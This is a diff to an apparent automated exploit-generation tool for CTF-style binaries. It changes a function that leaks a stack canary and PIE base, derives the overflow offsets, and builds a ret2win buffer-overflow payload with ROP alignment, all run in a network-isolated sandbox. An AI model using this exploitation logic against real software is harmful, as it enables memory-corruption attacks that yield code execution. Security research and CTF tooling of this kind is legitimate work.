@@ -1081,10 +1081,11 @@ def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_t
                                    "(offsets/leak slot?)"}
 
 
-def canary_pie_ret2win(exe, workdir, *, canary_trigger, canary_offset, ret_offset, win_off,
-                       target_bytes, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
-                       loop_feed: bytes = None, base_argv=(), marker: bytes = b"LYKOS-PCW-9931",
-                       timeout: float = 8.0, mem_mb: int = 2048) -> dict:
+def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, ret_offset=None,
+                       win_off, target_bytes, leak_recipe=None, canary_index=None,
+                       canary_regex: str = r"0x[0-9a-fA-F]+", loop_feed: bytes = None, base_argv=(),
+                       marker: bytes = b"LYKOS-PCW-9931", timeout: float = 8.0,
+                       mem_mb: int = 2048) -> dict:
     """ret2win on a PIE + stack-canary target with an in-binary win (a function that spawns a shell
     / prints the flag). Both the canary AND the PIE base are random per process, so BOTH are leaked
     IN THE SAME PROCESS as the overflow: `canary_trigger` discloses them (a format `%p` dump or a
@@ -1105,25 +1106,69 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger, canary_offset, ret_offse
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
 
-    def _leak(p):
+    def _leak(p, sel):
+        # Leak phase. Either a SINGLE trigger (an ungated %p dump / over-read) or a RECIPE -- the
+        # multi-step input the interaction model found to reach a leak behind a typed prompt
+        # sequence. The recipe is replayed with the SAME stall-based drain the interaction model
+        # used (menu._drain: read until the program blocks on the next read), so the full over-read
+        # dump is captured -- a quiet-based read truncated it and recover_pie_base (>=2 corroborating
+        # image pointers) then failed in the replay. The process is kept OPEN for the overflow.
+        dump = b""
         try:
-            p.stdin.write(canary_trigger)
-            p.stdin.flush()
+            if leak_recipe:
+                from ..fuzz import menu as _menu
+                for step in leak_recipe:                     # drain the prompt, then answer it
+                    o, alive = _menu._drain(p, sel, idle=0.2, deadline=time.time() + max(0.5, timeout / 3))
+                    dump += o.encode("latin1") if isinstance(o, str) else (o or b"")
+                    p.stdin.write(step if isinstance(step, (bytes, bytearray)) else bytes(step))
+                    p.stdin.flush()
+                o, _a = _menu._drain(p, sel, idle=0.2, deadline=time.time() + timeout)  # the leak output
+                dump += o.encode("latin1") if isinstance(o, str) else (o or b"")
+            else:
+                p.stdin.write(canary_trigger)
+                p.stdin.flush()
+                dump += _read_until(p, time.time() + timeout / 2)
         except (BrokenPipeError, OSError):
-            return None, None
-        dump = _read_until(p, time.time() + timeout / 2)
+            return None, None, None
         vals = [int(m.group(0), 16) for m in rx.finditer(dump) if _allint(m.group(0))]
         vals += _le_pointer_words(dump)
         cvals = list(vals) + _le_canary_words(dump)
         canary = (cvals[canary_index] if canary_index is not None
                   and -len(cvals) <= canary_index < len(cvals) else rop.find_canary(cvals))
+        pos = None
+        # Self-derive the overflow distance to the canary from the over-read, relative to the
+        # printed fill run: a RAW over-read carries the full 8-byte canary word (its byte offset is
+        # the distance); a printf("%s") over-read TRUNCATES at the canary's NUL low byte, so the 7
+        # non-NUL bytes follow the run and the run LENGTH is the distance.
+        if leak_recipe:
+            fill = bytes(leak_recipe[-1]).rstrip(b"\n")
+            m = _re.search(_re.escape(fill[:16]) + rb"+", dump) if fill else None
+            if m:
+                if canary is not None:                       # raw: locate the full canary word
+                    at = dump.find(_struct.pack("<Q", canary))
+                    if at >= m.start():
+                        pos = at - m.start()
+                tail = dump[m.end(): m.end() + 16]           # %s-truncated reconstruction
+                if pos is None and len(tail) >= 7 and all(b != 0 for b in tail[:7]) and \
+                        sum(1 for b in tail[:7] if 0x20 <= b < 0x7f) <= 2:
+                    canary = int.from_bytes(b"\x00" + tail[:7], "little")
+                    pos = m.end() - m.start()
+                for i in range(len(tail) - 5):
+                    if tail[i + 5] in (0x7F, 0x55, 0x56):
+                        vals.append(int.from_bytes(tail[i:i + 6], "little"))
         pie_base = _exploit.recover_pie_base(vals, target_bytes)
-        return canary, pie_base
+        return canary, pie_base, pos
 
     # A PIE target with a relative loader must run with the sandbox cwd in its staged dir.
     rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
-    for align in (False, True):                                  # optional ret-slide for alignment
-        for _ in range(3):
+    # Residue sweep: a preceding numeric/line prompt leaves its delimiter in the pipe, and a fill
+    # longer than a fixed-size read spills the excess -- bytes the OVERFLOW read then swallows BEFORE
+    # our payload, shifting every frame field. We cannot drain the kernel pipe from the writer, and
+    # the leak + overflow must share ONE process (both bases are per-process), so we re-leak per skew
+    # and shift the canary/return offsets back by `skew` until the frame lands. skew=0 is the clean
+    # (residue-free) case and is tried first.
+    for skew in (0, 1, 2, 3, 4):
+        for align in (False, True):                              # optional ret-slide for alignment
             preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
             cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
                                          chdir=(exedir if rel else "")) + [str(exe)] + argv
@@ -1134,11 +1179,26 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger, canary_offset, ret_offse
             except Exception as e:                               # noqa: BLE001
                 return {"ok": False, "reason": f"spawn failed: {e!r}"}
             try:
-                _read_until(p, time.time() + 0.5)
-                canary, pie_base = _leak(p)
+                import selectors as _selectors
+                sel = _selectors.DefaultSelector()
+                sel.register(p.stdout, _selectors.EVENT_READ)
+                if not leak_recipe:
+                    _read_until(p, time.time() + 0.5)        # consume the opening banner (single-trigger)
+                canary, pie_base, pos = _leak(p, sel)
                 if canary is None or not pie_base:
                     continue                                     # need BOTH in this process
-                pre = rop.build_canary_prefix(canary_offset, canary, ret_offset)
+                # offsets: analyst/caller value wins; else self-derive from the over-read -- the
+                # canary sits `pos` bytes into the overflow, the return another 16 past it (the
+                # standard [buf][canary][saved rbp][return] frame).
+                co = canary_offset if canary_offset is not None else pos
+                ro = ret_offset if ret_offset is not None else ((pos + 16) if pos is not None else None)
+                if co is None or ro is None:
+                    continue
+                co -= skew                                       # absorb pipe residue shift
+                ro -= skew
+                if co < 0 or ro < 0:
+                    continue
+                pre = rop.build_canary_prefix(co, canary, ro)
                 payload = bytearray(pre)
                 if align:                                        # a lone `ret` to fix 16-byte align
                     r = rop.find_gadget(target_bytes, "ret")
